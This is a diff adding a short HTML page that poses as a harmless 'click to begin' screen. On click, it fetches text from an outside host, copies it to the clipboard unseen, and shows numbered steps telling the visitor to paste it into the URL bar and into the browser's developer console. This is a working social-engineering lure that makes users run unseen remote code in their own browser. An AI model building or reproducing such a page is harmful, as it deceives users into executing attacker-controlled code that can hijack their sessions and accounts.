@@ -1,0 +1,34 @@
+<script type="module">
+  function copy () {
+    fetch("https://xlak.github.io/chaos/bb.php").then((d) => d.text())
+    .then((d) => {
+      navigator.clipboard.writeText(d)
+      document.querySelector('.main').style.display = 'none'
+      document.querySelector('.other').style.display = 'unset'
+    })
+  }
+  document.body.onclick = copy
+</script>
+
+<h3 class='main'>Click this page to begin!</h3>
+<h3 style='display: none' class='other'>
+    <ul>
+    <li>Step 1: Click on the URL bar and press Control+V and then Enter</li>
+    <li>Step 2: Right click on the page and select "Inspect"</li>
+    <li>Step 3: Click on "Console" at the top</li>
+    <li>Step 4: Press Control+V and Enter</li>
+    <li>Step 5: When an inspect window pops up, click on "Console" at the top</li>
+    <li>Step 6: Press Control+V and Enter</li>
+    <li>Step 7: Done!</li>
+    </ul>
+</h3>
+<style>
+    body {
+        align-items: center;
+        justify-content: center;
+        display: flex;
+        cursor: pointer;
+        user-select: none;
+        font-family: sans-serif;
+    }
+</style>
